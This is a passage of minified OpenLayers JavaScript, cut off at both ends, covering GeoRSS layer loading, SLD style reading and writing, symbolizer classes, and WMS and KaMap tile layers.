{href:a.getAttribute("href"),mimeType:a.getAttribute("mimeType"),encoding:a.getAttribute("encoding"),schema:a.getAttribute("schema")}},Data:function(a,b){b.data={};this.readChildNodes(a,b)},LiteralData:function(a,b){b.literalData={dataType:a.getAttribute("dataType"),uom:a.getAttribute("uom"),value:this.getChildValue(a)}},ComplexData:function(a,b){b.complexData={mimeType:a.getAttribute("mimeType"),schema:a.getAttribute("schema"),encoding:a.getAttribute("encoding"),value:""};if(this.isSimpleContent(a)){var c; for(c=a.firstChild;c;c=c.nextSibling)switch(c.nodeType){case 3:case 4:b.complexData.value+=c.nodeValue}}else for(c=a.firstChild;c;c=c.nextSibling)1==c.nodeType&amp;&amp;(b.complexData.value=c)},BoundingBox:function(a,b){b.boundingBoxData={dimensions:a.getAttribute("dimensions"),crs:a.getAttribute("crs")};this.readChildNodes(a,b.boundingBoxData)}},ows:OpenLayers.Format.OWSCommon.v1_1_0.prototype.readers.ows},CLASS_NAME:"OpenLayers.Format.WPSExecute"});OpenLayers.Layer.GeoRSS=OpenLayers.Class(OpenLayers.Layer.Markers,{location:null,features:null,formatOptions:null,selectedFeature:null,icon:null,popupSize:null,useFeedTitle:!0,initialize:function(a,b,c){OpenLayers.Layer.Markers.prototype.initialize.apply(this,[a,c]);this.location=b;this.features=[]},destroy:function(){OpenLayers.Layer.Markers.prototype.destroy.apply(this,arguments);this.clearFeatures();this.features=null},loadRSS:function(){this.loaded||(this.events.triggerEvent("loadstart"),OpenLayers.Request.GET({url:this.location, success:this.parseData,scope:this}),this.loaded=!0)},moveTo:function(a,b,c){OpenLayers.Layer.Markers.prototype.moveTo.apply(this,arguments);this.visibility&amp;&amp;!this.loaded&amp;&amp;this.loadRSS()},parseData:function(a){var b=a.responseXML;b&amp;&amp;b.documentElement||(b=OpenLayers.Format.XML.prototype.read(a.responseText));if(this.useFeedTitle){a=null;try{a=b.getElementsByTagNameNS("*","title")[0].firstChild.nodeValue}catch(c){a=b.getElementsByTagName("title")[0].firstChild.nodeValue}a&amp;&amp;this.setName(a)}a={};OpenLayers.Util.extend(a, this.formatOptions);this.map&amp;&amp;!this.projection.equals(this.map.getProjectionObject())&amp;&amp;(a.externalProjection=this.projection,a.internalProjection=this.map.getProjectionObject());b=(new OpenLayers.Format.GeoRSS(a)).read(b);a=0;for(var d=b.length;a&lt;d;a++){var e={},f=b[a];if(f.geometry){var g=f.attributes.title?f.attributes.title:"Untitled",h=f.attributes.description?f.attributes.description:"No description.",k=f.attributes.link?f.attributes.link:"",f=f.geometry.getBounds().getCenterLonLat();e.icon= null==this.icon?OpenLayers.Marker.defaultIcon():this.icon.clone();e.popupSize=this.popupSize?this.popupSize.clone():new OpenLayers.Size(250,120);if(g||h){e.title=g;e.description=h;var l='&lt;div class="olLayerGeoRSSClose">[x]&lt;/div>',l=l+'&lt;div class="olLayerGeoRSSTitle">';k&amp;&amp;(l+='&lt;a class="link" href="'+k+'" target="_blank">');l+=g;k&amp;&amp;(l+="&lt;/a>");l+="&lt;/div>";l+='&lt;div style="" class="olLayerGeoRSSDescription">';l+=h;l+="&lt;/div>";e.popupContentHTML=l}f=new OpenLayers.Feature(this,f,e);this.features.push(f); e=f.createMarker();e.events.register("click",f,this.markerClick);this.addMarker(e)}}this.events.triggerEvent("loadend")},markerClick:function(a){var b=this==this.layer.selectedFeature;this.layer.selectedFeature=b?null:this;for(var c=0,d=this.layer.map.popups.length;c&lt;d;c++)this.layer.map.removePopup(this.layer.map.popups[c]);b||(b=this.createPopup(),OpenLayers.Event.observe(b.div,"click",OpenLayers.Function.bind(function(){for(var a=0,b=this.layer.map.popups.length;a&lt;b;a++)this.layer.map.removePopup(this.layer.map.popups[a])}, this)),this.layer.map.addPopup(b));OpenLayers.Event.stop(a)},clearFeatures:function(){if(null!=this.features)for(;0&lt;this.features.length;){var a=this.features[0];OpenLayers.Util.removeItem(this.features,a);a.destroy()}},CLASS_NAME:"OpenLayers.Layer.GeoRSS"});OpenLayers.Symbolizer.Point=OpenLayers.Class(OpenLayers.Symbolizer,{initialize:function(a){OpenLayers.Symbolizer.prototype.initialize.apply(this,arguments)},CLASS_NAME:"OpenLayers.Symbolizer.Point"});OpenLayers.Symbolizer.Line=OpenLayers.Class(OpenLayers.Symbolizer,{initialize:function(a){OpenLayers.Symbolizer.prototype.initialize.apply(this,arguments)},CLASS_NAME:"OpenLayers.Symbolizer.Line"});OpenLayers.Symbolizer.Text=OpenLayers.Class(OpenLayers.Symbolizer,{initialize:function(a){OpenLayers.Symbolizer.prototype.initialize.apply(this,arguments)},CLASS_NAME:"OpenLayers.Symbolizer.Text"});OpenLayers.Format.SLD.v1=OpenLayers.Class(OpenLayers.Format.Filter.v1_0_0,{namespaces:{sld:"http://www.opengis.net/sld",ogc:"http://www.opengis.net/ogc",gml:"http://www.opengis.net/gml",xlink:"http://www.w3.org/1999/xlink",xsi:"http://www.w3.org/2001/XMLSchema-instance"},defaultPrefix:"sld",schemaLocation:null,multipleSymbolizers:!1,featureTypeCounter:null,defaultSymbolizer:{fillColor:"#808080",fillOpacity:1,strokeColor:"#000000",strokeOpacity:1,strokeWidth:1,strokeDashstyle:"solid",pointRadius:3, graphicName:"square"},read:function(a,b){b=OpenLayers.Util.applyDefaults(b,this.options);var c={namedLayers:!0===b.namedLayersAsArray?[]:{}};this.readChildNodes(a,c);return c},readers:OpenLayers.Util.applyDefaults({sld:{StyledLayerDescriptor:function(a,b){b.version=a.getAttribute("version");this.readChildNodes(a,b)},Name:function(a,b){b.name=this.getChildValue(a)},Title:function(a,b){b.title=this.getChildValue(a)},Abstract:function(a,b){b.description=this.getChildValue(a)},NamedLayer:function(a,b){var c= {userStyles:[],namedStyles:[]};this.readChildNodes(a,c);for(var d=0,e=c.userStyles.length;d&lt;e;++d)c.userStyles[d].layerName=c.name;OpenLayers.Util.isArray(b.namedLayers)?b.namedLayers.push(c):b.namedLayers[c.name]=c},NamedStyle:function(a,b){b.namedStyles.push(this.getChildName(a.firstChild))},UserStyle:function(a,b){var c={defaultsPerSymbolizer:!0,rules:[]};this.featureTypeCounter=-1;this.readChildNodes(a,c);this.multipleSymbolizers?(delete c.defaultsPerSymbolizer,c=new OpenLayers.Style2(c)):c=new OpenLayers.Style(this.defaultSymbolizer, c);b.userStyles.push(c)},IsDefault:function(a,b){"1"==this.getChildValue(a)&amp;&amp;(b.isDefault=!0)},FeatureTypeStyle:function(a,b){++this.featureTypeCounter;var c={rules:this.multipleSymbolizers?b.rules:[]};this.readChildNodes(a,c);this.multipleSymbolizers||(b.rules=c.rules)},Rule:function(a,b){var c;this.multipleSymbolizers&amp;&amp;(c={symbolizers:[]});c=new OpenLayers.Rule(c);this.readChildNodes(a,c);b.rules.push(c)},ElseFilter:function(a,b){b.elseFilter=!0},MinScaleDenominator:function(a,b){b.minScaleDenominator= parseFloat(this.getChildValue(a))},MaxScaleDenominator:function(a,b){b.maxScaleDenominator=parseFloat(this.getChildValue(a))},TextSymbolizer:function(a,b){var c={};this.readChildNodes(a,c);this.multipleSymbolizers?(c.zIndex=this.featureTypeCounter,b.symbolizers.push(new OpenLayers.Symbolizer.Text(c))):b.symbolizer.Text=OpenLayers.Util.applyDefaults(c,b.symbolizer.Text)},LabelPlacement:function(a,b){this.readChildNodes(a,b)},PointPlacement:function(a,b){var c={};this.readChildNodes(a,c);c.labelRotation= c.rotation;delete c.rotation;var d,e=b.labelAnchorPointX,f=b.labelAnchorPointY;e&lt;=1/3?d="l":e>1/3&amp;&amp;e&lt;2/3?d="c":e>=2/3&amp;&amp;(d="r");f&lt;=1/3?d+="b":f>1/3&amp;&amp;f&lt;2/3?d+="m":f>=2/3&amp;&amp;(d+="t");c.labelAlign=d;OpenLayers.Util.applyDefaults(b,c)},AnchorPoint:function(a,b){this.readChildNodes(a,b)},AnchorPointX:function(a,b){var c=this.readers.ogc._expression.call(this,a);c&amp;&amp;(b.labelAnchorPointX=c)},AnchorPointY:function(a,b){var c=this.readers.ogc._expression.call(this,a);c&amp;&amp;(b.labelAnchorPointY=c)},Displacement:function(a, b){this.readChildNodes(a,b)},DisplacementX:function(a,b){var c=this.readers.ogc._expression.call(this,a);c&amp;&amp;(b.labelXOffset=c)},DisplacementY:function(a,b){var c=this.readers.ogc._expression.call(this,a);c&amp;&amp;(b.labelYOffset=c)},LinePlacement:function(a,b){this.readChildNodes(a,b)},PerpendicularOffset:function(a,b){var c=this.readers.ogc._expression.call(this,a);c&amp;&amp;(b.labelPerpendicularOffset=c)},Label:function(a,b){var c=this.readers.ogc._expression.call(this,a);c&amp;&amp;(b.label=c)},Font:function(a,b){this.readChildNodes(a, b)},Halo:function(a,b){var c={};this.readChildNodes(a,c);b.haloRadius=c.haloRadius;b.haloColor=c.fillColor;b.haloOpacity=c.fillOpacity},Radius:function(a,b){var c=this.readers.ogc._expression.call(this,a);null!=c&amp;&amp;(b.haloRadius=c)},RasterSymbolizer:function(a,b){var c={};this.readChildNodes(a,c);this.multipleSymbolizers?(c.zIndex=this.featureTypeCounter,b.symbolizers.push(new OpenLayers.Symbolizer.Raster(c))):b.symbolizer.Raster=OpenLayers.Util.applyDefaults(c,b.symbolizer.Raster)},Geometry:function(a, b){b.geometry={};this.readChildNodes(a,b.geometry)},ColorMap:function(a,b){b.colorMap=[];this.readChildNodes(a,b.colorMap)},ColorMapEntry:function(a,b){var c=a.getAttribute("quantity"),d=a.getAttribute("opacity");b.push({color:a.getAttribute("color"),quantity:null!==c?parseFloat(c):void 0,label:a.getAttribute("label")||void 0,opacity:null!==d?parseFloat(d):void 0})},LineSymbolizer:function(a,b){var c={};this.readChildNodes(a,c);this.multipleSymbolizers?(c.zIndex=this.featureTypeCounter,b.symbolizers.push(new OpenLayers.Symbolizer.Line(c))): b.symbolizer.Line=OpenLayers.Util.applyDefaults(c,b.symbolizer.Line)},PolygonSymbolizer:function(a,b){var c={fill:!1,stroke:!1};this.multipleSymbolizers||(c=b.symbolizer.Polygon||c);this.readChildNodes(a,c);this.multipleSymbolizers?(c.zIndex=this.featureTypeCounter,b.symbolizers.push(new OpenLayers.Symbolizer.Polygon(c))):b.symbolizer.Polygon=c},PointSymbolizer:function(a,b){var c={fill:!1,stroke:!1,graphic:!1};this.multipleSymbolizers||(c=b.symbolizer.Point||c);this.readChildNodes(a,c);this.multipleSymbolizers? (c.zIndex=this.featureTypeCounter,b.symbolizers.push(new OpenLayers.Symbolizer.Point(c))):b.symbolizer.Point=c},Stroke:function(a,b){b.stroke=!0;this.readChildNodes(a,b)},Fill:function(a,b){b.fill=!0;this.readChildNodes(a,b)},CssParameter:function(a,b){var c=a.getAttribute("name"),d=this.cssMap[c];b.label&amp;&amp;("fill"===c?d="fontColor":"fill-opacity"===c&amp;&amp;(d="fontOpacity"));d&amp;&amp;(c=this.readers.ogc._expression.call(this,a))&amp;&amp;(b[d]=c)},Graphic:function(a,b){b.graphic=!0;var c={};this.readChildNodes(a,c); for(var d="stroke strokeColor strokeWidth strokeOpacity strokeLinecap fill fillColor fillOpacity graphicName rotation graphicFormat".split(" "),e,f,g=0,h=d.length;g&lt;h;++g)e=d[g],f=c[e],void 0!=f&amp;&amp;(b[e]=f);void 0!=c.opacity&amp;&amp;(b.graphicOpacity=c.opacity);void 0!=c.size&amp;&amp;(isNaN(c.size/2)?b.graphicWidth=c.size:b.pointRadius=c.size/2);void 0!=c.href&amp;&amp;(b.externalGraphic=c.href);void 0!=c.rotation&amp;&amp;(b.rotation=c.rotation)},ExternalGraphic:function(a,b){this.readChildNodes(a,b)},Mark:function(a,b){this.readChildNodes(a, b)},WellKnownName:function(a,b){b.graphicName=this.getChildValue(a)},Opacity:function(a,b){var c=this.readers.ogc._expression.call(this,a);c&amp;&amp;(b.opacity=c)},Size:function(a,b){var c=this.readers.ogc._expression.call(this,a);c&amp;&amp;(b.size=c)},Rotation:function(a,b){var c=this.readers.ogc._expression.call(this,a);c&amp;&amp;(b.rotation=c)},OnlineResource:function(a,b){b.href=this.getAttributeNS(a,this.namespaces.xlink,"href")},Format:function(a,b){b.graphicFormat=this.getChildValue(a)}}},OpenLayers.Format.Filter.v1_0_0.prototype.readers), cssMap:{stroke:"strokeColor","stroke-opacity":"strokeOpacity","stroke-width":"strokeWidth","stroke-linecap":"strokeLinecap","stroke-dasharray":"strokeDashstyle",fill:"fillColor","fill-opacity":"fillOpacity","font-family":"fontFamily","font-size":"fontSize","font-weight":"fontWeight","font-style":"fontStyle"},getCssProperty:function(a){var b=null,c;for(c in this.cssMap)if(this.cssMap[c]==a){b=c;break}return b},getGraphicFormat:function(a){var b,c;for(c in this.graphicFormats)if(this.graphicFormats[c].test(a)){b= c;break}return b||this.defaultGraphicFormat},defaultGraphicFormat:"image/png",graphicFormats:{"image/jpeg":/\.jpe?g$/i,"image/gif":/\.gif$/i,"image/png":/\.png$/i},write:function(a){return this.writers.sld.StyledLayerDescriptor.apply(this,[a])},writers:OpenLayers.Util.applyDefaults({sld:{_OGCExpression:function(a,b){var c=this.createElementNSPlus(a),d="string"==typeof b?b.split("${"):[b];c.appendChild(this.createTextNode(d[0]));for(var e,f,g=1,h=d.length;g&lt;h;g++)e=d[g],f=e.indexOf("}"),0&lt;f?(this.writeNode("ogc:PropertyName", {property:e.substring(0,f)},c),c.appendChild(this.createTextNode(e.substring(++f)))):c.appendChild(this.createTextNode("${"+e));return c},StyledLayerDescriptor:function(a){var b=this.createElementNSPlus("sld:StyledLayerDescriptor",{attributes:{version:this.VERSION,"xsi:schemaLocation":this.schemaLocation}});b.setAttribute("xmlns:ogc",this.namespaces.ogc);b.setAttribute("xmlns:gml",this.namespaces.gml);a.name&amp;&amp;this.writeNode("Name",a.name,b);a.title&amp;&amp;this.writeNode("Title",a.title,b);a.description&amp;&amp; this.writeNode("Abstract",a.description,b);if(OpenLayers.Util.isArray(a.namedLayers))for(var c=0,d=a.namedLayers.length;c&lt;d;++c)this.writeNode("NamedLayer",a.namedLayers[c],b);else for(c in a.namedLayers)this.writeNode("NamedLayer",a.namedLayers[c],b);return b},Name:function(a){return this.createElementNSPlus("sld:Name",{value:a})},Title:function(a){return this.createElementNSPlus("sld:Title",{value:a})},Abstract:function(a){return this.createElementNSPlus("sld:Abstract",{value:a})},NamedLayer:function(a){var b= this.createElementNSPlus("sld:NamedLayer");this.writeNode("Name",a.name,b);if(a.namedStyles)for(var c=0,d=a.namedStyles.length;c&lt;d;++c)this.writeNode("NamedStyle",a.namedStyles[c],b);if(a.userStyles)for(c=0,d=a.userStyles.length;c&lt;d;++c)this.writeNode("UserStyle",a.userStyles[c],b);return b},NamedStyle:function(a){var b=this.createElementNSPlus("sld:NamedStyle");this.writeNode("Name",a,b);return b},UserStyle:function(a){var b=this.createElementNSPlus("sld:UserStyle");a.name&amp;&amp;this.writeNode("Name", a.name,b);a.title&amp;&amp;this.writeNode("Title",a.title,b);a.description&amp;&amp;this.writeNode("Abstract",a.description,b);a.isDefault&amp;&amp;this.writeNode("IsDefault",a.isDefault,b);if(this.multipleSymbolizers&amp;&amp;a.rules){for(var c={0:[]},d=[0],e,f,g,h,k,l=0,m=a.rules.length;l&lt;m;++l)if(e=a.rules[l],e.symbolizers){f={};for(var n=0,p=e.symbolizers.length;n&lt;p;++n)g=e.symbolizers[n],h=g.zIndex,h in f||(k=e.clone(),k.symbolizers=[],f[h]=k),f[h].symbolizers.push(g.clone());for(h in f)h in c||(d.push(h),c[h]=[]),c[h].push(f[h])}else c[0].push(e.clone()); d.sort();l=0;for(m=d.length;l&lt;m;++l)e=c[d[l]],0&lt;e.length&amp;&amp;(k=a.clone(),k.rules=c[d[l]],this.writeNode("FeatureTypeStyle",k,b))}else this.writeNode("FeatureTypeStyle",a,b);return b},IsDefault:function(a){return this.createElementNSPlus("sld:IsDefault",{value:a?"1":"0"})},FeatureTypeStyle:function(a){for(var b=this.createElementNSPlus("sld:FeatureTypeStyle"),c=0,d=a.rules.length;c&lt;d;++c)this.writeNode("Rule",a.rules[c],b);return b},Rule:function(a){var b=this.createElementNSPlus("sld:Rule");a.name&amp;&amp; this.writeNode("Name",a.name,b);a.title&amp;&amp;this.writeNode("Title",a.title,b);a.description&amp;&amp;this.writeNode("Abstract",a.description,b);a.elseFilter?this.writeNode("ElseFilter",null,b):a.filter&amp;&amp;this.writeNode("ogc:Filter",a.filter,b);void 0!=a.minScaleDenominator&amp;&amp;this.writeNode("MinScaleDenominator",a.minScaleDenominator,b);void 0!=a.maxScaleDenominator&amp;&amp;this.writeNode("MaxScaleDenominator",a.maxScaleDenominator,b);var c,d;if(this.multipleSymbolizers&amp;&amp;a.symbolizers)for(var e=0,f=a.symbolizers.length;e&lt; f;++e)d=a.symbolizers[e],c=d.CLASS_NAME.split(".").pop(),this.writeNode(c+"Symbolizer",d,b);else for(var f=OpenLayers.Style.SYMBOLIZER_PREFIXES,e=0,g=f.length;e&lt;g;++e)c=f[e],(d=a.symbolizer[c])&amp;&amp;this.writeNode(c+"Symbolizer",d,b);return b},ElseFilter:function(){return this.createElementNSPlus("sld:ElseFilter")},MinScaleDenominator:function(a){return this.createElementNSPlus("sld:MinScaleDenominator",{value:a})},MaxScaleDenominator:function(a){return this.createElementNSPlus("sld:MaxScaleDenominator", {value:a})},LineSymbolizer:function(a){var b=this.createElementNSPlus("sld:LineSymbolizer");this.writeNode("Stroke",a,b);return b},Stroke:function(a){var b=this.createElementNSPlus("sld:Stroke");void 0!=a.strokeColor&amp;&amp;this.writeNode("CssParameter",{symbolizer:a,key:"strokeColor"},b);void 0!=a.strokeOpacity&amp;&amp;this.writeNode("CssParameter",{symbolizer:a,key:"strokeOpacity"},b);void 0!=a.strokeWidth&amp;&amp;this.writeNode("CssParameter",{symbolizer:a,key:"strokeWidth"},b);void 0!=a.strokeDashstyle&amp;&amp;"solid"!== a.strokeDashstyle&amp;&amp;this.writeNode("CssParameter",{symbolizer:a,key:"strokeDashstyle"},b);void 0!=a.strokeLinecap&amp;&amp;this.writeNode("CssParameter",{symbolizer:a,key:"strokeLinecap"},b);return b},CssParameter:function(a){return this.createElementNSPlus("sld:CssParameter",{attributes:{name:this.getCssProperty(a.key)},value:a.symbolizer[a.key]})},TextSymbolizer:function(a){var b=this.createElementNSPlus("sld:TextSymbolizer");null!=a.label&amp;&amp;this.writeNode("Label",a.label,b);null==a.fontFamily&amp;&amp;null==a.fontSize&amp;&amp; null==a.fontWeight&amp;&amp;null==a.fontStyle||this.writeNode("Font",a,b);null==a.labelAnchorPointX&amp;&amp;null==a.labelAnchorPointY&amp;&amp;null==a.labelAlign&amp;&amp;null==a.labelXOffset&amp;&amp;null==a.labelYOffset&amp;&amp;null==a.labelRotation&amp;&amp;null==a.labelPerpendicularOffset||this.writeNode("LabelPlacement",a,b);null==a.haloRadius&amp;&amp;null==a.haloColor&amp;&amp;null==a.haloOpacity||this.writeNode("Halo",a,b);null==a.fontColor&amp;&amp;null==a.fontOpacity||this.writeNode("Fill",{fillColor:a.fontColor,fillOpacity:a.fontOpacity},b);return b},LabelPlacement:function(a){var b= this.createElementNSPlus("sld:LabelPlacement");null==a.labelAnchorPointX&amp;&amp;null==a.labelAnchorPointY&amp;&amp;null==a.labelAlign&amp;&amp;null==a.labelXOffset&amp;&amp;null==a.labelYOffset&amp;&amp;null==a.labelRotation||null!=a.labelPerpendicularOffset||this.writeNode("PointPlacement",a,b);null!=a.labelPerpendicularOffset&amp;&amp;this.writeNode("LinePlacement",a,b);return b},LinePlacement:function(a){var b=this.createElementNSPlus("sld:LinePlacement");this.writeNode("PerpendicularOffset",a.labelPerpendicularOffset,b);return b},PerpendicularOffset:function(a){return this.createElementNSPlus("sld:PerpendicularOffset", {value:a})},PointPlacement:function(a){var b=this.createElementNSPlus("sld:PointPlacement");null==a.labelAnchorPointX&amp;&amp;null==a.labelAnchorPointY&amp;&amp;null==a.labelAlign||this.writeNode("AnchorPoint",a,b);null==a.labelXOffset&amp;&amp;null==a.labelYOffset||this.writeNode("Displacement",a,b);null!=a.labelRotation&amp;&amp;this.writeNode("Rotation",a.labelRotation,b);return b},AnchorPoint:function(a){var b=this.createElementNSPlus("sld:AnchorPoint"),c=a.labelAnchorPointX,d=a.labelAnchorPointY;null!=c&amp;&amp;this.writeNode("AnchorPointX", c,b);null!=d&amp;&amp;this.writeNode("AnchorPointY",d,b);if(null==c&amp;&amp;null==d){var e=a.labelAlign.substr(0,1);a=a.labelAlign.substr(1,1);"l"===e?c=0:"c"===e?c=0.5:"r"===e&amp;&amp;(c=1);"b"===a?d=0:"m"===a?d=0.5:"t"===a&amp;&amp;(d=1);this.writeNode("AnchorPointX",c,b);this.writeNode("AnchorPointY",d,b)}return b},AnchorPointX:function(a){return this.createElementNSPlus("sld:AnchorPointX",{value:a})},AnchorPointY:function(a){return this.createElementNSPlus("sld:AnchorPointY",{value:a})},Displacement:function(a){var b=this.createElementNSPlus("sld:Displacement"); null!=a.labelXOffset&amp;&amp;this.writeNode("DisplacementX",a.labelXOffset,b);null!=a.labelYOffset&amp;&amp;this.writeNode("DisplacementY",a.labelYOffset,b);return b},DisplacementX:function(a){return this.createElementNSPlus("sld:DisplacementX",{value:a})},DisplacementY:function(a){return this.createElementNSPlus("sld:DisplacementY",{value:a})},Font:function(a){var b=this.createElementNSPlus("sld:Font");a.fontFamily&amp;&amp;this.writeNode("CssParameter",{symbolizer:a,key:"fontFamily"},b);a.fontSize&amp;&amp;this.writeNode("CssParameter", {symbolizer:a,key:"fontSize"},b);a.fontWeight&amp;&amp;this.writeNode("CssParameter",{symbolizer:a,key:"fontWeight"},b);a.fontStyle&amp;&amp;this.writeNode("CssParameter",{symbolizer:a,key:"fontStyle"},b);return b},Label:function(a){return this.writers.sld._OGCExpression.call(this,"sld:Label",a)},Halo:function(a){var b=this.createElementNSPlus("sld:Halo");a.haloRadius&amp;&amp;this.writeNode("Radius",a.haloRadius,b);(a.haloColor||a.haloOpacity)&amp;&amp;this.writeNode("Fill",{fillColor:a.haloColor,fillOpacity:a.haloOpacity},b); return b},Radius:function(a){return this.createElementNSPlus("sld:Radius",{value:a})},RasterSymbolizer:function(a){var b=this.createElementNSPlus("sld:RasterSymbolizer");a.geometry&amp;&amp;this.writeNode("Geometry",a.geometry,b);a.opacity&amp;&amp;this.writeNode("Opacity",a.opacity,b);a.colorMap&amp;&amp;this.writeNode("ColorMap",a.colorMap,b);return b},Geometry:function(a){var b=this.createElementNSPlus("sld:Geometry");a.property&amp;&amp;this.writeNode("ogc:PropertyName",a,b);return b},ColorMap:function(a){for(var b=this.createElementNSPlus("sld:ColorMap"), c=0,d=a.length;c&lt;d;++c)this.writeNode("ColorMapEntry",a[c],b);return b},ColorMapEntry:function(a){var b=this.createElementNSPlus("sld:ColorMapEntry");b.setAttribute("color",a.color);void 0!==a.opacity&amp;&amp;b.setAttribute("opacity",parseFloat(a.opacity));void 0!==a.quantity&amp;&amp;b.setAttribute("quantity",parseFloat(a.quantity));void 0!==a.label&amp;&amp;b.setAttribute("label",a.label);return b},PolygonSymbolizer:function(a){var b=this.createElementNSPlus("sld:PolygonSymbolizer");!1!==a.fill&amp;&amp;this.writeNode("Fill", a,b);!1!==a.stroke&amp;&amp;this.writeNode("Stroke",a,b);return b},Fill:function(a){var b=this.createElementNSPlus("sld:Fill");a.fillColor&amp;&amp;this.writeNode("CssParameter",{symbolizer:a,key:"fillColor"},b);null!=a.fillOpacity&amp;&amp;this.writeNode("CssParameter",{symbolizer:a,key:"fillOpacity"},b);return b},PointSymbolizer:function(a){var b=this.createElementNSPlus("sld:PointSymbolizer");this.writeNode("Graphic",a,b);return b},Graphic:function(a){var b=this.createElementNSPlus("sld:Graphic");void 0!=a.externalGraphic? this.writeNode("ExternalGraphic",a,b):this.writeNode("Mark",a,b);void 0!=a.graphicOpacity&amp;&amp;this.writeNode("Opacity",a.graphicOpacity,b);void 0!=a.pointRadius?this.writeNode("Size",2*a.pointRadius,b):void 0!=a.graphicWidth&amp;&amp;this.writeNode("Size",a.graphicWidth,b);void 0!=a.rotation&amp;&amp;this.writeNode("Rotation",a.rotation,b);return b},ExternalGraphic:function(a){var b=this.createElementNSPlus("sld:ExternalGraphic");this.writeNode("OnlineResource",a.externalGraphic,b);a=a.graphicFormat||this.getGraphicFormat(a.externalGraphic); this.writeNode("Format",a,b);return b},Mark:function(a){var b=this.createElementNSPlus("sld:Mark");a.graphicName&amp;&amp;this.writeNode("WellKnownName",a.graphicName,b);!1!==a.fill&amp;&amp;this.writeNode("Fill",a,b);!1!==a.stroke&amp;&amp;this.writeNode("Stroke",a,b);return b},WellKnownName:function(a){return this.createElementNSPlus("sld:WellKnownName",{value:a})},Opacity:function(a){return this.createElementNSPlus("sld:Opacity",{value:a})},Size:function(a){return this.writers.sld._OGCExpression.call(this,"sld:Size", a)},Rotation:function(a){return this.createElementNSPlus("sld:Rotation",{value:a})},OnlineResource:function(a){return this.createElementNSPlus("sld:OnlineResource",{attributes:{"xlink:type":"simple","xlink:href":a}})},Format:function(a){return this.createElementNSPlus("sld:Format",{value:a})}}},OpenLayers.Format.Filter.v1_0_0.prototype.writers),CLASS_NAME:"OpenLayers.Format.SLD.v1"});OpenLayers.Layer.WMS=OpenLayers.Class(OpenLayers.Layer.Grid,{DEFAULT_PARAMS:{service:"WMS",version:"1.1.1",request:"GetMap",styles:"",format:"image/jpeg"},isBaseLayer:!0,encodeBBOX:!1,noMagic:!1,yx:{},initialize:function(a,b,c,d){var e=[];c=OpenLayers.Util.upperCaseObject(c);1.3&lt;=parseFloat(c.VERSION)&amp;&amp;!c.EXCEPTIONS&amp;&amp;(c.EXCEPTIONS="INIMAGE");e.push(a,b,c,d);OpenLayers.Layer.Grid.prototype.initialize.apply(this,e);OpenLayers.Util.applyDefaults(this.params,OpenLayers.Util.upperCaseObject(this.DEFAULT_PARAMS)); !this.noMagic&amp;&amp;(this.params.TRANSPARENT&amp;&amp;"true"==this.params.TRANSPARENT.toString().toLowerCase())&amp;&amp;(null!=d&amp;&amp;d.isBaseLayer||(this.isBaseLayer=!1),"image/jpeg"==this.params.FORMAT&amp;&amp;(this.params.FORMAT=OpenLayers.Util.alphaHack()?"image/gif":"image/png"))},clone:function(a){null==a&amp;&amp;(a=new OpenLayers.Layer.WMS(this.name,this.url,this.params,this.getOptions()));return a=OpenLayers.Layer.Grid.prototype.clone.apply(this,[a])},reverseAxisOrder:function(){var a=this.projection.getCode();return 1.3&lt;=parseFloat(this.params.VERSION)&amp;&amp; !!(this.yx[a]||OpenLayers.Projection.defaults[a]&amp;&amp;OpenLayers.Projection.defaults[a].yx)},getURL:function(a){a=this.adjustBounds(a);var b=this.getImageSize(),c={},d=this.reverseAxisOrder();c.BBOX=this.encodeBBOX?a.toBBOX(null,d):a.toArray(d);c.WIDTH=b.w;c.HEIGHT=b.h;return this.getFullRequestString(c)},mergeNewParams:function(a){a=[OpenLayers.Util.upperCaseObject(a)];return OpenLayers.Layer.Grid.prototype.mergeNewParams.apply(this,a)},getFullRequestString:function(a,b){var c=this.map.getProjectionObject(), c=this.projection&amp;&amp;this.projection.equals(c)?this.projection.getCode():c.getCode(),c="none"==c?null:c;1.3&lt;=parseFloat(this.params.VERSION)?this.params.CRS=c:this.params.SRS=c;"boolean"==typeof this.params.TRANSPARENT&amp;&amp;(a.TRANSPARENT=this.params.TRANSPARENT?"TRUE":"FALSE");return OpenLayers.Layer.Grid.prototype.getFullRequestString.apply(this,arguments)},CLASS_NAME:"OpenLayers.Layer.WMS"});OpenLayers.Layer.KaMap=OpenLayers.Class(OpenLayers.Layer.Grid,{isBaseLayer:!0,DEFAULT_PARAMS:{i:"jpeg",map:""},initialize:function(a,b,c,d){OpenLayers.Layer.Grid.prototype.initialize.apply(this,arguments);this.params=OpenLayers.Util.applyDefaults(this.params,this.DEFAULT_PARAMS)},getURL:function(a){a=this.adjustBounds(a);var b=this.map.getResolution(),c=Math.round(1E4*this.map.getScale())/1E4,d=Math.round(a.left/b);a=-Math.round(a.top/b);return this.getFullRequestString({t:a,l:d,s:c})},calculateGridLayout:function(a, b,c){b=c*this.tileSize.w;c*=this.tileSize.h;return{tilelon:b,tilelat:c,startcol:Math.floor(a.left/b)-this.buffer,startrow:Math.floor(a.top/c)+this.buffer}},getTileBoundsForGridIndex:function(a,b){this.getTileOrigin();var c=this.gridLayout,d=c.tilelon,e=c.tilelat,f=(c.startcol+b)*d,c=(c.startrow-a)*e;return new OpenLayers.Bounds(f,c,f+d,c+e)},clone:function(a){null==a&amp;&amp;(a=new OpenLayers.Layer.KaMap(this.name,this.url,this.params,this.getOptions()));a=OpenLayers.Layer.Grid.prototype.clone.apply(this, [a]);null!=this.tileSize&amp;&amp;(a.tileSize=this.tileSize.clone());a.grid=[];return a},getTileBounds:function(a){var b=this.getResolution(),c=b*this.tileSize.w,b=b*this.tileSize.h,d=this.getLonLatFromViewPortPx(a);a=c*Math.floor(d.lon/c);d=b*Math.floor(d.lat/b);return new OpenLayers.Bounds(a,d,a+c,d+b)},CLASS_NAME:"OpenLayers.Layer.KaMap"});OpenLayers.Format.WMC.v1_1_0=OpenLayers.Class(OpenLayers.Format.WMC.v1,{VERSION:"1.1.0",schemaLocation:"http://www.opengis.net/context http://schemas.opengis.net/context/1.1.0/context.xsd",initialize:function(a){OpenLayers.Format.WMC.v1.prototype.initialize.apply(this,[a])},read_sld_MinScaleDenominator:function(a,b){var c=parseFloat(this.getChildValue(b));0&lt;c&amp;&amp;(a.maxScale=c)},read_sld_MaxScaleDenominator:function(a,b){a.minScale=parseFloat(this.getChildValue(b))},read_wmc_SRS:function(a,b){"srs"in a||(a.srs={});a.srs[this.getChildValue(b)]=!0},write_wmc_Layer:function(a){var b=OpenLayers.Format.WMC.v1.prototype.write_wmc_Layer.apply(this,[a]);if(a.maxScale){var 